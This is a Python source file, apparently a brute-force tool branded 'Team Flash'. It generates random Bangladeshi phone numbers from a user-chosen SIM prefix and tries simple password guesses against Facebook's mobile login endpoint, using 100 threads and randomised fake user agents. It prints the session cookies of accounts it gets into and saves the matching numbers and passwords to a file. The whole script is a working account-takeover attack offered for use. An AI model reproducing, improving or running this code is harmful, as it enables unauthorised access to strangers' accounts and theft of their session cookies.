#-----------------OWNER : NIROB RAHMAN------------------#
#---------------POWERED BY TEAM FLASH------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]

ugen2 = ('Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-14-6-5',
'Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-55-1',
'Dalvik/2.1.0 (Linux; U; Android 9; Akari AX-117 ATV Build/PPR1.180610.011',
'NokiaXpressMusic(19.01);SymbianOS/9.1 Series60/3.0',
'NokiaXpressMusic/SymbianOS/9.1 Series60',
'NokiaXpressMusic/SymbianOS;S60V5',)

for tg in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	turag=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(turag)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo=(""" \x1b[1;32m

\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;31m┃\033[0;42;37m┏┓┓ ┏┓┏┓┓┏  \033[1;37;40m\033[1;31m ┃\033[1;33mOWNER   : NIROB NOOB \033[1;31m   ┃
\033[1;31m┃\033[0;42;37m┣ ┃ ┣┫┗┓┣┫   \033[1;37;40m\033[1;31m┃\033[1;33mGITHUB  : NIROB0777 \033[1;31m   ┃\033[1;32m  ┏━━━━━━━━━━━━━━┓\033[1;32m 
\033[1;31m┃\033[0;42;37m┻ ┗┛┛┗┗┛┛┗   \033[1;37;40m\033[1;31m┃\033[1;33mFACEBOK : NIROB _RAHMAN\033[1;31m┃\033[1;32m  ┃ \033[0;41;37m VERSION \033[0;37;41mFREE\033[1;37;40m\033[1;32m┃ \033[1;37;40m \033[1;32m
\033[1;91m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;32m┗━━━━━━━━━━━━━━┛\033[1;32m
""")     
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/1480620579408146/')
    print(logo)
    print('[🌺] SIM CODE BD= [017] [019] [018] [016]')
    nude = input('\033[1;32m[\033[1;32m🍁\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[🌺] [1000] [5000) [10000] [50000]')
    limit = int(input('[🍁] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as turag:
        os.system('clear')
        print(logo)
        os.system('xdg-open https://www.facebook.com/profile.php?id=61550086553512')
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SELECTED SIM CODE : '+nude)
        print('\033[1;32m[\033[1;32m✓\033[1;32m] TOTAL CRACK LIMIT : '+tl)
        print('\033[1;33m[\033[1;32m✓\033[1;32m] SORRY SOME ID,S WAS LOCKED ')
        print('\033[1;91m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            turag.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;91m[\033[1;32m~\033[1;32m] [🍁]YOUR  CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write('\r[\033[1;92mFLASH\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://t.facebook.com',
    'referer': 'https://t.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[FLASH-OK🍁] {uid} • {ps}" '  \n\033[1;33m [⚠️]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/FLASH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()